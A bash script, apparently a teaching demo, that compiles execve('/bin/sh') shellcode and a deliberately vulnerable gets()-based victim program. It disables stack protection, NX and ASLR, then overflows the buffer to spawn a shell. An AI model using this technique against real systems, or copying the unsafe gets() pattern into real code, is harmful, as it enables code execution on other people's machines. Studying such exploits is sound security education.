#!/bin/bash

curr=`pwd`
tmp_dir=`mktemp -d`
cd $tmp_dir

##launch.c
cat > launch.c << "EOF"
int main(void)
{
    asm("\
        here:              \n\
        pop %rdi            \n\
        xor %rax, %rax      \n\
        xor %rsi, %rsi      \n\
        xor %rdx, %rdx      \n\
        movb $0x3b, %al     \n\
        syscall             \n\
        call here           \n\
        check:              \n\
        .string \"/bin/sh\" \n\
        ");
    return 0;
}
EOF

gcc -o launch  launch.c

echo extracting shellcode
offset=0x`objdump -d launch | grep here | cut -d\  -f1`
echo $offset
offset=$((offset-0x400000))
echo shellcode start at: $offset

xxd -s0x4d6 -l32 -p launch > shellcode

# deal with victim 
echo "compile victim"

cat > victim.c << "eof"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


int main(void)
{
    char buf[32];
    printf("%p\n", buf);
    gets(buf);
    return 0;
}
eof

gcc -fno-stack-protector -o victim victim.c
echo disable NX
execstack -s victim
echo find buffer addr and close aslr 
addr=$(echo | setarch $(arch) -R ./victim)
echo buffer start $addr
a=`printf %16x $addr | tac -rs..`
echo $a

echo start exploiting...
( (cat shellcode ; printf %016d 0 ; echo $a) | xxd -r -p ; cat )  | setarch `arch` -R ./victim

## removing tmp dir
echo removing tmp dir
cd $curr
rm -r $tmp_dir
